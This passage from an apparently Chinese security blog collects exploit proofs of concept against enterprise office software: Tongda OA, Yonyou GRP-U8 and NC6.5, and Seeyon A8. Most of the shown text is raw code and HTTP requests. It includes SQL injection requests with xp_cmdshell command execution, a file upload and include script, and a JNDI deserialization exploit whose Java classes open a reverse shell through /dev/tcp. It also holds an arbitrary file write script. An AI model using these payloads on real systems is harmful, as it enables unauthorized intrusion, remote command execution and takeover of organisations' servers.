(SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])---&amp;endtime=1598918400&amp;view=month&amp;condition=1</span><br></pre></td></tr></table></figure>

<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/general/email/sentbox/get_index_data.php?asc=0&amp;boxid=&amp;boxname=sentbox&amp;curnum=3&amp;emailtype=ALLMAIL&amp;keyword=sample%40email.tst&amp;orderby=1&amp;pagelimit=20&amp;tag=&amp;timestamp=1598069133&amp;total=</span> HTTP/1.1</span><br><span class="line"><span class="attribute">X-Requested-With</span>: XMLHttpRequest</span><br><span class="line"><span class="attribute">Referer</span>: https://www.0-sec.org/</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=54j5v894kbrm5sitdvv8nk4520; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=c9e143ff</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip,deflate</span><br><span class="line"><span class="attribute">Host</span>: www.0-sec.org</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br></pre></td></tr></table></figure>

<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/general/email/inbox/get_index_data.php?asc=0&amp;boxid=&amp;boxname=inbox&amp;curnum=0&amp;emailtype=ALLMAIL&amp;keyword=&amp;orderby=3--&amp;pagelimit=10&amp;tag=&amp;timestamp=1598069103&amp;total=</span> HTTP/1.1</span><br><span class="line"><span class="attribute">X-Requested-With</span>: XMLHttpRequest</span><br><span class="line"><span class="attribute">Referer</span>: https://www.0-sec.org</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=54j5v894kbrm5sitdvv8nk4520; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=c9e143ff</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip,deflate</span><br><span class="line"><span class="attribute">Host</span>: www.0-sec.org</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br></pre></td></tr></table></figure>

<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/general/appbuilder/web/report/repdetail/edit?link_type=false&amp;slot=&#123;&#125;&amp;id=2</span> HTTP/1.1</span><br><span class="line"><span class="attribute">X-Requested-With</span>: XMLHttpRequest</span><br><span class="line"><span class="attribute">Referer</span>: https://www.0-sec.org</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=54j5v894kbrm5sitdvv8nk4520; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=c9e143ff</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip,deflate</span><br><span class="line"><span class="attribute">Host</span>: www.0-sec.org</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br></pre></td></tr></table></figure>

<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/general/file_folder/swfupload_new.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36</span><br><span class="line"><span class="attribute">Referer</span>: http://192.168.202.1/</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Host</span>: 192.168.202.1</span><br><span class="line"><span class="attribute">Content-Length</span>: 391</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: en-US</span><br><span class="line"><span class="attribute">Content-Type</span>: multipart/form-data; boundary=----------GFioQpMK0vv2</span><br><span class="line"></span><br><span class="line">------------GFioQpMK0vv2</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="ATTACHMENT_ID"</span><br><span class="line"></span><br><span class="line"><span class="attribute">1</span></span><br><span class="line"><span class="attribute">------------GFioQpMK0vv2</span></span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="ATTACHMENT_NAME"</span><br><span class="line"></span><br><span class="line"><span class="attribute">1</span></span><br><span class="line"><span class="attribute">------------GFioQpMK0vv2</span></span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="FILE_SORT"</span><br><span class="line"></span><br><span class="line"><span class="attribute">2</span></span><br><span class="line"><span class="attribute">------------GFioQpMK0vv2</span></span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="SORT_ID"</span><br><span class="line"></span><br><span class="line">------------GFioQpMK0vv2--</span><br></pre></td></tr></table></figure>

<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">会过滤掉：空格、制表符、换行符、回车符、垂直制表符等。只能报错，或尝试 and 等语句判断还是没有问题的。</span><br><span class="line"></span><br><span class="line"><span class="keyword">POST</span> <span class="string">/general/file_folder/api.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36</span><br><span class="line"><span class="attribute">Referer</span>: http://192.168.202.1/general/file_folder/public_folder.php?FILE_SORT=1&amp;SORT_ID=59</span><br><span class="line"><span class="attribute">X-Resource-Type</span>: xhr</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=g1njm64pl94eietps80muet5d7; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=fab32701</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Host</span>: 192.168.202.1</span><br><span class="line"><span class="attribute">Pragma</span>: no-cache</span><br><span class="line"><span class="attribute">x-requested-with</span>: XMLHttpRequest</span><br><span class="line"><span class="attribute">Content-Length</span>: 82</span><br><span class="line"><span class="attribute">x-wvs-id</span>: Acunetix-Deepscan/209</span><br><span class="line"><span class="attribute">Cache-Control</span>: no-cache</span><br><span class="line"><span class="attribute">accept</span>: */*</span><br><span class="line"><span class="attribute">origin</span>: http://192.168.202.1</span><br><span class="line"><span class="attribute">Accept-Language</span>: en-US</span><br><span class="line"><span class="attribute">content-type</span>: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line"></span><br><span class="line">CONTENT_ID_STR=222&amp;SORT_ID=59&amp;FILE_SORT=1&amp;action=sign</span><br></pre></td></tr></table></figure>

<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/general/appbuilder/web/meeting/meetingmanagement/meetingreceipt</span> HTTP/1.1</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36</span><br><span class="line"><span class="attribute">Referer</span>: http://192.168.202.1/general/meeting/myapply/details.php?affair=true&amp;id=5&amp;nosign=true&amp;reminding=true</span><br><span class="line"><span class="attribute">X-Resource-Type</span>: xhr</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=g1njm64pl94eietps80muet5d7; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=fab32701</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Host</span>: 192.168.202.1</span><br><span class="line"><span class="attribute">Pragma</span>: no-cache</span><br><span class="line"><span class="attribute">x-requested-with</span>: XMLHttpRequest</span><br><span class="line"><span class="attribute">Content-Length</span>: 97</span><br><span class="line"><span class="attribute">x-wvs-id</span>: Acunetix-Deepscan/186</span><br><span class="line"><span class="attribute">Cache-Control</span>: no-cache</span><br><span class="line"><span class="attribute">accept</span>: */*</span><br><span class="line"><span class="attribute">origin</span>: http://192.168.202.1</span><br><span class="line"><span class="attribute">Accept-Language</span>: en-US</span><br><span class="line"><span class="attribute">content-type</span>: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line"></span><br><span class="line">m_id=5&amp;join_flag=2&amp;remark='%3b%20exec%20master%2e%2exp_cmdshell%20'ping%20172%2e10%2e1%2e255'--</span><br></pre></td></tr></table></figure>

<p><strong>参考：</strong>零组；<a href="https://www.cnblogs.com/yuzly/p/13608532.html" target="_blank" rel="noopener">https://www.cnblogs.com/yuzly/p/13608532.html</a></p>
<h4 id="4、通达OA文件包含漏洞"><a href="#4、通达OA文件包含漏洞" class="headerlink" title="4、通达OA文件包含漏洞"></a>4、通达OA文件包含漏洞</h4><p>备注：3月份老漏洞</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">POC = &#123;<span class="string">"P"</span>: <span class="string">"7789"</span>, <span class="string">"DEST_UID"</span>: <span class="string">"1"</span>, <span class="string">"UPLOAD_MODE"</span>: <span class="string">"2"</span>&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span><span class="params">(self)</span>:</span></span><br><span class="line">    <span class="comment"># 上传漏洞、文件包含漏洞url</span></span><br><span class="line">    uploadUrl = self.url + <span class="string">"/ispirit/im/upload.php"</span></span><br><span class="line">    includeUrl = self.url + <span class="string">"/ispirit/interface/gateway.php"</span></span><br><span class="line">    <span class="comment"># 2017版 includeUrl = self.url + "/mac/gateway.php"</span></span><br><span class="line">    <span class="comment"># 这里写上传的php或其它文件内容</span></span><br><span class="line">    files = &#123;<span class="string">'ATTACHMENT'</span>: <span class="string">"Tongda_Vul_test"</span>&#125;</span><br><span class="line">    <span class="comment"># files = &#123;'ATTACHMENT': 'echo("hello")'&#125;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        uploadRes = requests.post(uploadUrl, data=POC, files=files)</span><br><span class="line">        <span class="comment"># 文件上传后路径</span></span><br><span class="line">        path = uploadRes.text</span><br><span class="line">        path = path[path.find(<span class="string">'@'</span>) + <span class="number">1</span>:path.rfind(<span class="string">'|'</span>)].replace(<span class="string">"_"</span>, <span class="string">"\/"</span>).replace(<span class="string">"|"</span>, <span class="string">"."</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># json形式包含url访问本地</span></span><br><span class="line">        includeData = &#123;<span class="string">"json"</span>: <span class="string">"&#123;\"url\":\"/general/../../attach/im/"</span> + path + <span class="string">"\"&#125;"</span>&#125;</span><br><span class="line">        includeRes = requests.post(includeUrl, data=includeData)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"Tongda_Vul_test"</span> <span class="keyword">in</span> includeRes.text:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>

<h4 id="5、用友GRP-u8-XXE-amp-SQL注入导致命令执行"><a href="#5、用友GRP-u8-XXE-amp-SQL注入导致命令执行" class="headerlink" title="5、用友GRP-u8 XXE&amp;SQL注入导致命令执行"></a>5、用友GRP-u8 XXE&amp;SQL注入导致命令执行</h4><p><strong>描述：</strong> 用友GRP-u8存在XXE漏洞，该漏洞源于应用程序解析XML输入时没有进制外部实体的加载，导致可加载恶意外部文件。</p>
<p><strong>利用条件：</strong>无需登录</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/Proxy</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Accept</span>: Accept: */*</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/4.0 (compatible; MSIE 6.0;)</span><br><span class="line"><span class="attribute">Host</span>: host</span><br><span class="line"><span class="attribute">Content-Length</span>: 357</span><br><span class="line"><span class="attribute">Connection</span>: Keep-Alive</span><br><span class="line"><span class="attribute">Cache-Control</span>: no-cache</span><br><span class="line"></span><br><span class="line">cVer=9.8.0&amp;dp=&lt;?xml version="1.0" encoding="GB2312"?&gt;&lt;R9PACKET version="1"&gt;&lt;DATAFORMAT&gt;XML&lt;/DATAFORMAT&gt;&lt;R9FUNCTION&gt;&lt;NAME&gt;AS_DataRequest&lt;/NAME&gt;&lt;PARAMS&gt;&lt;PARAM&gt;&lt;NAME&gt;ProviderName&lt;/NAME&gt;&lt;DATA format="text"&gt;DataSetProviderData&lt;/DATA&gt;&lt;/PARAM&gt;&lt;PARAM&gt;&lt;NAME&gt;Data&lt;/NAME&gt;&lt;DATA format="text"&gt;exec xp_cmdshell 'net user'&lt;/DATA&gt;&lt;/PARAM&gt;&lt;/PARAMS&gt;&lt;/R9FUNCTION&gt;&lt;/R9PACKET&gt;</span><br></pre></td></tr></table></figure>

<p><strong>参考：</strong><a href="https://www.cnblogs.com/yuzly/p/13675224.html" target="_blank" rel="noopener">https://www.cnblogs.com/yuzly/p/13675224.html</a></p>
<h4 id="6、用友NC6-5反序列化漏洞"><a href="#6、用友NC6-5反序列化漏洞" class="headerlink" title="6、用友NC6.5反序列化漏洞"></a>6、用友NC6.5反序列化漏洞</h4><figure class="highlight java"><figcaption><span>explpit.java</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> nc.bs.framework.common.NCLocator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">poc</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">attack</span><span class="params">(String url, String jndipath)</span> </span>&#123;</span><br><span class="line">        Properties env = <span class="keyword">new</span> Properties();</span><br><span class="line">        <span class="keyword">if</span> (!url.startsWith(<span class="string">"http"</span>)) &#123;</span><br><span class="line">            url = <span class="string">"http://"</span> + url;</span><br><span class="line">        &#125;</span><br><span class="line">        env.put(<span class="string">"SERVICEDISPATCH_URL"</span>, url + <span class="string">"/ServiceDispatcherServlet"</span>);</span><br><span class="line">        NCLocator locator = NCLocator.getInstance(env);</span><br><span class="line">        locator.lookup(jndipath);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        attack(<span class="string">"http://target"</span>, <span class="string">"ldap://ip:port/classname"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><figcaption><span>remote.java</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Name;</span><br><span class="line"><span class="keyword">import</span> javax.naming.spi.ObjectFactory;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">remote</span> <span class="keyword">implements</span> <span class="title">ObjectFactory</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">remote</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            java.lang.Runtime.getRuntime().exec(<span class="keyword">new</span> String[]&#123;<span class="string">"/bin/sh"</span>,<span class="string">"-c"</span>,<span class="string">"sh -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1"</span>&#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>利用 nc 自带的类进行远程部署利用</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> nc.bs.framework.common.ComponentMetaVO;</span><br><span class="line"><span class="keyword">import</span> nc.bs.framework.rmi.RemoteAddressSelector;</span><br><span class="line"><span class="keyword">import</span> nc.bs.framework.rmi.RemoteProxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">remote</span> <span class="keyword">implements</span> <span class="title">RemoteProxy</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">remote</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            java.lang.Runtime.getRuntime().exec(<span class="keyword">new</span> String[]&#123;<span class="string">"/bin/sh"</span>,<span class="string">"-c"</span>,<span class="string">"sh -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1"</span>&#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getAttribute</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAttribute</span><span class="params">(String s, Object o)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> ComponentMetaVO <span class="title">getComponentMetaVO</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getRetryMax</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setRetryMax</span><span class="params">(<span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">getRetryInterval</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setRetryInterval</span><span class="params">(<span class="keyword">long</span> l)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setRemoteAddressSelector</span><span class="params">(RemoteAddressSelector remoteAddressSelector)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> RemoteAddressSelector <span class="title">getRemoteAddressSelector</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>参考：<a href="https://blog.sari3l.com/posts/608d18f0/" target="_blank" rel="noopener">https://blog.sari3l.com/posts/608d18f0/</a> <a href="https://xz.aliyun.com/t/8242?page=5" target="_blank" rel="noopener">https://xz.aliyun.com/t/8242?page=5</a></p>
<h4 id="7、致远A8任意文件写入文件上传漏洞"><a href="#7、致远A8任意文件写入文件上传漏洞" class="headerlink" title="7、致远A8任意文件写入文件上传漏洞"></a>7、致远A8任意文件写入文件上传漏洞</h4><p>备注：去年HW老漏洞</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">POC = <span class="string">'DBSTEP V3.0     354             0               28             DBSTEP=OKMLlKlV\r\nOPTION=S3WYOSWLBSGr\r\ncurrentUserId=zUCTwigsziCAPLesw4gsw4oEwV66\r\nCREATEDATE=wUghPB3szB3Xwg66\r\nRECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6\r\noriginalFileId=wV66\r\noriginalCreateDate=wUghPB3szB3Xwg66\r\nFILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT3brV6\r\nneedReadFile=yRWZdAS6\r\noriginalCreateDate=wLSGP4oEzLKAz4=iz=66\r\nseeyon_A8_arbitrary_upload168f3e4c470b9d72920d3dff7bfa0a0e'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span><span class="params">(self)</span>:</span></span><br><span class="line">    vulUrl = self.url + <span class="string">"/seeyon/htmlofficeservlet"</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">"Content-Type"</span>: <span class="string">"application/x-www-form-urlencoded"</span>,</span><br><span class="line">        <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html)"</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        rsp = requests.post(url=vulUrl, data=POC, verify=<span class="literal">False</span>, headers=headers, timeout=<span class="number">5</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'BSTEP=OKMLlKlV'</span> <span class="keyword">in</span> rsp.text:</span><br><span class="line">            r = requests.get(self.url + <span class="string">'/seeyon/test123456.txt'</span>)</span><br><span class="line">            <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">                httpResponse = <span class="string">"HTTP Response Status:"</span> + str(r.status_code) \</span><br><span class="line">                               + <span class="string">"\nHTTP Response Headers:"</span> + str(r.headers) \</span><br><span class="line">                               + <span class="string">"\nHTTP Response Body:\n"</span> + str(r.text)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> <span 